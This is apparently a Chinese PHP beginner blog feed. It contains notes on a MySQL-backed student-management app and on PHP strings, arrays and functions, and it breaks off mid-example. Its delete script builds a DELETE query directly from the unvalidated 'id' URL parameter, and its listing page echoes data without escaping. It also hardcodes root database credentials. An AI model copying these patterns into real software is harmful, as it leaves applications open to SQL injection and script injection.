sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; create table student(</span><br><span class="line">    -&gt; id int(10),</span><br><span class="line">    -&gt; name varchar(20),</span><br><span class="line">    -&gt; sex enum(&#x27;男&#x27;,&#x27;女&#x27;),</span><br><span class="line">    -&gt; age tinyint(4),</span><br><span class="line">    -&gt; edu enum(&#x27;初中&#x27;,&#x27;高中&#x27;,&#x27;大专&#x27;,&#x27;大本&#x27;,&#x27;研究生&#x27;),</span><br><span class="line">    -&gt; salary float(8,2) unsigned,</span><br><span class="line">    -&gt; bonus float(6,2) unsigned,</span><br><span class="line">    -&gt; city varchar(32)</span><br><span class="line">    -&gt; );</span><br><span class="line">Query OK, 0 rows affected (0.04 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; desc student;</span><br><span class="line">+<span class="comment">--------+-------------------------------------------------------+------+-----+---------+-------+</span></span><br><span class="line">| Field  | Type                                                  | Null | Key | Default | Extra |</span><br><span class="line">+<span class="comment">--------+-------------------------------------------------------+------+-----+---------+-------+</span></span><br><span class="line">| id     | int(10)                                               | YES  |     | NULL    |       |</span><br><span class="line">| name   | varchar(20)                                           | YES  |     | NULL    |       |</span><br><span class="line">| sex    | enum(&#x27;男&#x27;,&#x27;女&#x27;)                                       | YES  |     | NULL    |       |</span><br><span class="line">| age    | tinyint(4)                                            | YES  |     | NULL    |       |</span><br><span class="line">| edu    | enum(&#x27;初中&#x27;,&#x27;高中&#x27;,&#x27;大专&#x27;,&#x27;大本&#x27;,&#x27;研究生&#x27;)            | YES  |     | NULL    |       |</span><br><span class="line">| salary | float(8,2) unsigned                                   | YES  |     | NULL    |       |</span><br><span class="line">| bonus  | float(6,2) unsigned                                   | YES  |     | NULL    |       |</span><br><span class="line">| city   | varchar(32)                                           | YES  |     | NULL    |       |</span><br><span class="line">+<span class="comment">--------+-------------------------------------------------------+------+-----+---------+-------+</span></span><br><span class="line">8 rows in <span class="keyword">set</span> (<span class="number">0.01</span> sec)</span><br></pre></td></tr></table></figure><p>输入信息</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; insert into student (id,name,sex,age,edu,salary,bonus,city) values(1,&#39;steady&#39;,&#39;男&#39;,18,&#39;初中&#39;,8000,8999,&#39;烟台&#39;);</span><br></pre></td></tr></table></figure><h4 id="数据库连接文件–coon-php"><a href="#数据库连接文件–coon-php" class="headerlink" title="数据库连接文件–coon.php"></a>数据库连接文件–coon.php</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$db_addr=<span class="string">&quot;127.0.0.1&quot;</span>;</span><br><span class="line">$db_port=<span class="string">&quot;3306&quot;</span>;</span><br><span class="line">$db_name=<span class="string">&quot;test&quot;</span>;</span><br><span class="line">$db_charset=<span class="string">&quot;utf-8&quot;</span>;</span><br><span class="line">$db_user=<span class="string">&quot;root&quot;</span>;</span><br><span class="line">$dn_passwd=<span class="string">&quot;root&quot;</span>;</span><br><span class="line"><span class="keyword">if</span>(!$link=@mysqli_connect($db_addr.<span class="string">&quot;:&quot;</span>.$db_port,$db_user,$dn_passwd,$db_name))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;数据库连接错误。&quot;</span>;</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h4 id="学生信息列表显示文件–listt-php"><a href="#学生信息列表显示文件–listt-php" class="headerlink" title="学生信息列表显示文件–listt.php"></a>学生信息列表显示文件–listt.php</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//包含连接数据库的公共文件</span></span><br><span class="line"><span class="keyword">require_once</span>(<span class="string">&quot;./coon.php&quot;</span>);</span><br><span class="line"><span class="comment">//执行查询的SQL语句</span></span><br><span class="line">$sql = <span class="string">&quot;SELECT * FROM student ORDER BY id DESC&quot;</span>;</span><br><span class="line">$result = mysqli_query($link,$sql);</span><br><span class="line"><span class="comment">//获取所有行数据</span></span><br><span class="line">$arrs = mysqli_fetch_all($result,MYSQLI_ASSOC);</span><br><span class="line"><span class="comment">//获取学生人数</span></span><br><span class="line">$records = mysqli_num_rows($result);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta charset=<span class="string">&quot;utf-8&quot;</span>&gt;</span><br><span class="line">&lt;title&gt;学生信息管理中心&lt;/title&gt;</span><br><span class="line">&lt;script type=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><br><span class="line"><span class="comment">//定义一个JS的提示函数</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">confirmDel</span>(<span class="params">id</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">//询问是否要删除？</span></span><br><span class="line"><span class="keyword">if</span>(window.confirm(<span class="string">&quot;你真的要删除吗？&quot;</span>))</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">//如果单击&quot;确定&quot;按钮，跳转到delete.php页面</span></span><br><span class="line">location.href = <span class="string">&quot;./delete.php?id=&quot;</span>+id;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;div style=<span class="string">&quot;text-align:center;padding-bottom: 10px;&quot;</span>&gt;</span><br><span class="line">&lt;h2&gt;学生信息管理中心&lt;/h2&gt;</span><br><span class="line">&lt;a href=<span class="string">&quot;./add.php&quot;</span>&gt;添加学生&lt;/a&gt;</span><br><span class="line">共有&lt;font color=red&gt;<span class="meta">&lt;?php</span> <span class="keyword">echo</span> $records<span class="meta">?&gt;</span>&lt;/font&gt;个学生信息</span><br><span class="line">&lt;/div&gt;</span><br><span class="line">&lt;table width=<span class="string">&quot;600&quot;</span> border=<span class="string">&quot;1&quot;</span> align=<span class="string">&quot;center&quot;</span> rules=<span class="string">&quot;all&quot;</span> cellpadding=<span class="string">&quot;5&quot;</span>&gt;</span><br><span class="line">&lt;tr bgcolor=<span class="string">&#x27;#ccc&#x27;</span>&gt;</span><br><span class="line">&lt;th&gt;编号&lt;/th&gt;</span><br><span class="line">&lt;th&gt;姓名&lt;/th&gt;</span><br><span class="line">&lt;th&gt;性别&lt;/th&gt;</span><br><span class="line">&lt;th&gt;年龄&lt;/th&gt;</span><br><span class="line">&lt;th&gt;学历&lt;/th&gt;</span><br><span class="line">&lt;th&gt;工资&lt;/th&gt;</span><br><span class="line">&lt;th&gt;奖金&lt;/th&gt;</span><br><span class="line">&lt;th&gt;籍贯&lt;/th&gt;</span><br><span class="line">&lt;th&gt;操作选项&lt;/th&gt;</span><br><span class="line">&lt;/tr&gt;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//循环二维数组</span></span><br><span class="line"><span class="keyword">foreach</span>($arrs <span class="keyword">as</span> $arr)&#123;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;tr align=<span class="string">&quot;center&quot;</span>&gt;</span><br><span class="line">&lt;td&gt;<span class="meta">&lt;?php</span> <span class="keyword">echo</span> $arr[<span class="string">&#x27;id&#x27;</span>]<span class="meta">?&gt;</span>&lt;/td&gt;</span><br><span class="line">&lt;td&gt;<span class="meta">&lt;?php</span> <span class="keyword">echo</span> $arr[<span class="string">&#x27;name&#x27;</span>]<span class="meta">?&gt;</span>&lt;/td&gt;</span><br><span class="line">&lt;td&gt;<span class="meta">&lt;?php</span> <span class="keyword">echo</span> $arr[<span class="string">&#x27;sex&#x27;</span>]<span class="meta">?&gt;</span>&lt;/td&gt;</span><br><span class="line">&lt;td&gt;<span class="meta">&lt;?php</span> <span class="keyword">echo</span> $arr[<span class="string">&#x27;age&#x27;</span>]<span class="meta">?&gt;</span>&lt;/td&gt;</span><br><span class="line">&lt;td&gt;<span class="meta">&lt;?php</span> <span class="keyword">echo</span> $arr[<span class="string">&#x27;edu&#x27;</span>]<span class="meta">?&gt;</span>&lt;/td&gt;</span><br><span class="line">&lt;td&gt;<span class="meta">&lt;?php</span> <span class="keyword">echo</span> $arr[<span class="string">&#x27;salary&#x27;</span>]<span class="meta">?&gt;</span>&lt;/td&gt;</span><br><span class="line">&lt;td&gt;<span class="meta">&lt;?php</span> <span class="keyword">echo</span> $arr[<span class="string">&#x27;bonus&#x27;</span>]<span class="meta">?&gt;</span>&lt;/td&gt;</span><br><span class="line">&lt;td&gt;<span class="meta">&lt;?php</span> <span class="keyword">echo</span> $arr[<span class="string">&#x27;city&#x27;</span>]<span class="meta">?&gt;</span>&lt;/td&gt;</span><br><span class="line">&lt;td&gt;</span><br><span class="line">&lt;a href=<span class="string">&quot;&quot;</span>&gt;修改&lt;/a&gt; | </span><br><span class="line">&lt;a href=<span class="string">&quot;#&quot;</span> onClick=<span class="string">&quot;confirmDel(&lt;?php echo <span class="subst">$arr</span>[&#x27;id&#x27;]?&gt;)&quot;</span>&gt;删除&lt;/a&gt;</span><br><span class="line">&lt;/td&gt;</span><br><span class="line">&lt;/tr&gt;</span><br><span class="line"><span class="meta">&lt;?php</span> &#125;<span class="meta">?&gt;</span></span><br><span class="line">&lt;/table&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p>学生信息删除文件–deletee.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">require_once</span>(<span class="string">&#x27;./coon.php&#x27;</span>);</span><br><span class="line">$id=$_GET[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line">$sql=<span class="string">&quot;delete from student where id=<span class="subst">$id</span>&quot;</span>;</span><br><span class="line"><span class="keyword">if</span>(mysqli_query($link,$sql))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;学生id为<span class="subst">&#123;$id&#125;</span>的信息删除成功。&quot;</span>;</span><br><span class="line">    header(<span class="string">&quot;refresh:3;url=./listt.php&quot;</span>);</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h4 id="删除学生信息操作"><a href="#删除学生信息操作" class="headerlink" title="删除学生信息操作"></a>删除学生信息操作</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">require_once</span>(<span class="string">&#x27;./coon.php&#x27;</span>);</span><br><span class="line">$id=$_GET[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line">$sql=<span class="string">&quot;delete from student where id=<span class="subst">$id</span>&quot;</span>;</span><br><span class="line"><span class="keyword">if</span>(mysqli_query($link,$sql))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;学生id为<span class="subst">&#123;$id&#125;</span>的信息删除成功。&quot;</span>;</span><br><span class="line">    header(<span class="string">&quot;refresh:3;url=./listt.php&quot;</span>);</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> PHP开发学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PHP开发学习 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PHP开发学习--PHP基础3</title>
      <link href="2019/11/13/PHP%E5%BC%80%E5%8F%91%E5%AD%A6%E4%B9%A0--PHP%E5%9F%BA%E7%A1%803/"/>
      <url>2019/11/13/PHP%E5%BC%80%E5%8F%91%E5%AD%A6%E4%B9%A0--PHP%E5%9F%BA%E7%A1%803/</url>
      
        <content type="html"><![CDATA[<h1 id="PHP基础"><a href="#PHP基础" class="headerlink" title="PHP基础"></a>PHP基础</h1><h2 id="字符串详解"><a href="#字符串详解" class="headerlink" title="字符串详解"></a>字符串详解</h2><h3 id="4种不同形式的字符串"><a href="#4种不同形式的字符串" class="headerlink" title="4种不同形式的字符串"></a>4种不同形式的字符串</h3><h4 id="单引号字符串"><a href="#单引号字符串" class="headerlink" title="单引号字符串"></a>单引号字符串</h4><p>形式：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$s1 &#x3D; &#39;字符串内容&#39;</span><br></pre></td></tr></table></figure><p>特点：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">只能使用2个转义符：&#96;\\&#96;（代表一个反斜杠）&#96;\’&#96;（代表一个单引号）</span><br><span class="line"></span><br><span class="line">通常，如果没有其他特殊需求（比如字符串中使用一些转义符，以及一些变量），则推荐使用单引号字符串。</span><br></pre></td></tr></table></figure><h4 id="双引号字符串"><a href="#双引号字符串" class="headerlink" title="双引号字符串"></a>双引号字符串</h4><p>形式： </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$s1 &#x3D; &quot;字符串内容&quot;</span><br></pre></td></tr></table></figure><p>特点：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">1、能使用较为丰富的转义符，包括：\\\&quot;\n\r\t\$等</span><br><span class="line">\n：代表&quot;换行符&quot;（就是一个新行）</span><br><span class="line">\r：代表“回车符”（其实也是一个新行）</span><br><span class="line">\t：代表&quot;tab符&quot;，</span><br><span class="line">\$：代表&quot;$&quot;本身，因为双引号字符串中能识别（解析）变量，则如果不想要去解析，就用此转义！</span><br><span class="line">$v1 &#x3D; 10;</span><br><span class="line">echo  &quot;结果为：$v1&quot;;&#x2F;&#x2F;输出内容为： 结果为：10</span><br><span class="line">echo  &quot;结果为：\$v1&quot;;&#x2F;&#x2F;输出内容为： 结果为：$v1</span><br><span class="line">2、&quot;&quot;$&quot;符号在其中会被识别为是变量的起始符号，并试图读取变量值——即能识别变量；</span><br><span class="line">3、识别其中变量，建议使用大括号括起来，类似这样：&#123;$变量名&#125;， &#123;$数组[&#39;下标&#39;]&#125;</span><br></pre></td></tr></table></figure><h4 id="heredoc字符串"><a href="#heredoc字符串" class="headerlink" title="heredoc字符串"></a>heredoc字符串</h4><p>形式：$s1 = &lt;&lt;&lt;”标识符”</p><h4 id="nowdoc字符串"><a href="#nowdoc字符串" class="headerlink" title="nowdoc字符串"></a>nowdoc字符串</h4><p>形式：$s1 = &lt;&lt;&lt;’标识符’</p><p>heredoc字符串，和nowdoc字符串，适用于表达（描述）一大段内容的字符串，特别是适合于写html部分的代码（含js，css等）。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$html1=&lt;&lt;&lt;&quot;名字&quot;</span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript"><span class="keyword">var</span> v1=<span class="number">1</span>+<span class="number">3</span>;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">名字;</span><br></pre></td></tr></table></figure><h3 id="常用字符串函数"><a href="#常用字符串函数" class="headerlink" title="常用字符串函数"></a>常用字符串函数</h3><h4 id="字符串输出"><a href="#字符串输出" class="headerlink" title="字符串输出"></a>字符串输出</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">echo： 输出一个或多个字符（不是函数，是语言结构）</span><br><span class="line"><span class="keyword">print</span>：输出一个字符串</span><br><span class="line">print_r：输出变量的较为详细的信息</span><br><span class="line">var_dump：输出变量的完整信息</span><br></pre></td></tr></table></figure><h3 id="数组详解"><a href="#数组详解" class="headerlink" title="数组详解"></a>数组详解</h3><h4 id="数组的概念和定义"><a href="#数组的概念和定义" class="headerlink" title="数组的概念和定义"></a>数组的概念和定义</h4><p>数组有如下几种定义形式：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">形式1：</span><br><span class="line">$arr1  &#x3D;  array(单元1，单元2，...）；</span><br><span class="line"></span><br><span class="line">形式2：</span><br><span class="line">$arr2  &#x3D;  [单元1，单元2，...]；</span><br><span class="line"></span><br><span class="line">单元（元素）的形式为：  [下标&#x3D;&gt;]值</span><br><span class="line"></span><br><span class="line">形式3：（不推荐）</span><br><span class="line">$arr3[下标1]  &#x3D;  值1；</span><br><span class="line">$arr3[下标2]  &#x3D;  值2；</span><br><span class="line">......</span><br></pre></td></tr></table></figure><p>数据取值的语法形式：</p><p>$数组名[下标];//其中，下标可以是整数的，也可以是字符串的（注意有引号）。</p><h4 id="索引数组"><a href="#索引数组" class="headerlink" title="索引数组"></a>索引数组</h4><p>通常是指一个数组的下标是从0开始的连续的整数。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">举例1：</span><br><span class="line">$arr1 &#x3D; array(5, 8, 12,  2,  3);</span><br><span class="line">$arr2 &#x3D; [8, 22,  24,  22,  12];</span><br><span class="line">$arr3[ ] &#x3D; 8;</span><br><span class="line">$arr3[ ] &#x3D; 24;</span><br><span class="line">$arr3[ ] &#x3D; 22;</span><br></pre></td></tr></table></figure><h4 id="关联数组"><a href="#关联数组" class="headerlink" title="关联数组"></a>关联数组</h4><p>通常是指一个数组的下标都是字符串。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$person &#x3D; array(</span><br><span class="line">‘name’&#x3D;&gt;’张三’， </span><br><span class="line">‘age’&#x3D;&gt;18,  </span><br><span class="line">‘edu’&#x3D;&gt; ‘大学’,  </span><br><span class="line">‘salary’&#x3D;&gt;10000,  </span><br><span class="line">‘from’&#x3D;&gt;’北京’,</span><br><span class="line">);</span><br></pre></td></tr></table></figure><h4 id="PHP数组的维数"><a href="#PHP数组的维数" class="headerlink" title="PHP数组的维数"></a>PHP数组的维数</h4><p>一维、二维、三维。</p><h4 id="数组的遍历"><a href="#数组的遍历" class="headerlink" title="数组的遍历"></a>数组的遍历</h4><h5 id="使用foreach语句遍历数组"><a href="#使用foreach语句遍历数组" class="headerlink" title="使用foreach语句遍历数组"></a>使用foreach语句遍历数组</h5><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$steady=<span class="keyword">array</span>(<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>);</span><br><span class="line"><span class="keyword">foreach</span>($steady <span class="keyword">as</span> $key =&gt; $value)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;<span class="subst">$key</span>=&gt;<span class="subst">$value</span>&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>输出</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0</span>=&gt;<span class="number">1</span></span><br><span class="line"><span class="number">1</span>=&gt;<span class="number">2</span></span><br><span class="line"><span class="number">2</span>=&gt;<span class="number">3</span></span><br><span class="line"><span class="number">3</span>=&gt;<span class="number">4</span></span><br><span class="line"><span class="number">4</span>=&gt;<span class="number">5</span></span><br><span class="line"><span class="number">5</span>=&gt;<span class="number">6</span></span><br></pre></td></tr></table></figure><h5 id="使用for循环语句遍历数组"><a href="#使用for循环语句遍历数组" class="headerlink" title="使用for循环语句遍历数组"></a>使用for循环语句遍历数组</h5><p>php中，有如下几个函数，可以针对数组指针进行相应操作：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$re  &#x3D;  current( $arr1);&#x2F;&#x2F;取得数组中当前指针所在单元的值；</span><br><span class="line">$re  &#x3D;  key( $arr1 );&#x2F;&#x2F;取得数组中当前指针所在单元的键（下标）；</span><br><span class="line">$re  &#x3D;  next( $arr1 );&#x2F;&#x2F;将数组中的指针往后移动一个位置，并取得新位置上的值；</span><br><span class="line">$re  &#x3D;  prev( $arr1 );&#x2F;&#x2F;将数组中的指针往前移动一个位置，并取得新位置上的值；</span><br><span class="line">$re  &#x3D;  end( $arr1 );&#x2F;&#x2F;将数组中的指针移动到最后一个位置，并取得新位置上的值；</span><br><span class="line">$re  &#x3D;  reset($arr1);&#x2F;&#x2F;将数组中的指针移动到最前一个位置，并取得新位置上的值；</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> PHP开发学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PHP开发学习 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PHP开发学习--PHP基础2</title>
      <link href="2019/11/12/PHP%E5%BC%80%E5%8F%91%E5%AD%A6%E4%B9%A0--PHP%E5%9F%BA%E7%A1%802/"/>
      <url>2019/11/12/PHP%E5%BC%80%E5%8F%91%E5%AD%A6%E4%B9%A0--PHP%E5%9F%BA%E7%A1%802/</url>
      
        <content type="html"><![CDATA[<h1 id="PHP基础"><a href="#PHP基础" class="headerlink" title="PHP基础"></a>PHP基础</h1><h2 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h2><h3 id="函数的定义与调用"><a href="#函数的定义与调用" class="headerlink" title="函数的定义与调用"></a>函数的定义与调用</h3><h4 id="定义"><a href="#定义" class="headerlink" title="定义"></a>定义</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">function 函数名（$形参1，$形参2， ...... ）&#123;&#x2F;&#x2F;形参，就是形式参数，是变量.</span><br><span class="line"></span><br><span class="line">函数体语句块；&#x2F;&#x2F;就是若干行代码</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="调用"><a href="#调用" class="headerlink" title="调用"></a>调用</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">函数名（$实参1，$实参2， ...... ）；&#x2F;&#x2F;实参就是实际参数，是数据</span><br></pre></td></tr></table></figure><h3 id="函数执行原理"><a href="#函数执行原理" class="headerlink" title="函数执行原理"></a>函数执行原理</h3><p>程序总是运行在一个””内存空间”。</p><p>程序开始执行的位置所在的空间，可以称之为”主运行空间”。</p><p>实际上，通常函数外面的那些程序，都是运行在主空间中。</p><p>那么，函数的运行，就相对独立了——每个函数的每次调用，都是运行在单独的一个自己的空间中。</p><p><img src="https://steady-1302023625.cos.ap-beijing.myqcloud.com/makedown/image-20201112154437855.png" alt="image-20201112154437855"></p><h3 id="函数参数"><a href="#函数参数" class="headerlink" title="函数参数"></a>函数参数</h3><h4 id="形参"><a href="#形参" class="headerlink" title="形参"></a>形参</h4><p>就是定义函数的时候，在函数名后的小括号中给出的变量名。</p><p>形参，只能在函数内部使用——即该变量的使用范围仅仅局限于当前函数内部。</p><p>形参的本质是变量！</p><h4 id="实参"><a href="#实参" class="headerlink" title="实参"></a>实参</h4><p>就是调用函数的时候，在函数名后的小括号中给出的数据值。</p><p>实参的本质是数据！</p><h3 id="匿名函数"><a href="#匿名函数" class="headerlink" title="匿名函数"></a>匿名函数</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$f1 &#x3D; function(形参...) &#123;  .......  &#125;&#x2F;&#x2F;这是定义匿名函数的形式。</span><br><span class="line">$f1(实参);&#x2F;&#x2F;这就是调用该调用。可见其调用，跟可变函数的写法非常类似。</span><br></pre></td></tr></table></figure><h3 id="函数相关"><a href="#函数相关" class="headerlink" title="函数相关"></a>函数相关</h3><h4 id="变量的作用域问题"><a href="#变量的作用域问题" class="headerlink" title="变量的作用域问题"></a>变量的作用域问题</h4><p>3种作用域：局部作用域，全局作用域，超全局作用域；</p><p>有3种变量：局部变量，全局变量，超全局变量；</p><h5 id="局部作用域与局部变量"><a href="#局部作用域与局部变量" class="headerlink" title="局部作用域与局部变量"></a>局部作用域与局部变量</h5><p>函数内部范围的作用域，其中定义的变量就是局部变量（包括形参也是局部变量）。局部变量只能在其所在的局部作用域中使用（访问）。</p><p>局部变量在函数调用结束时，会被自动销毁（可以理解为函数执行结束，该执行空间也被销毁了）。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$steady&#x3D;&quot;steady is a hacker&quot;;</span><br><span class="line">function Jelly($v1,$v2)&#123;</span><br><span class="line">    $v3&#x3D;20;</span><br><span class="line">    echo $v3.&quot;&lt;br&gt;&quot;;</span><br><span class="line">&#125;</span><br><span class="line">echo $v3;&#x2F;&#x2F;报错变量为局部变量，在全局无法调用。</span><br><span class="line">echo $steady;</span><br><span 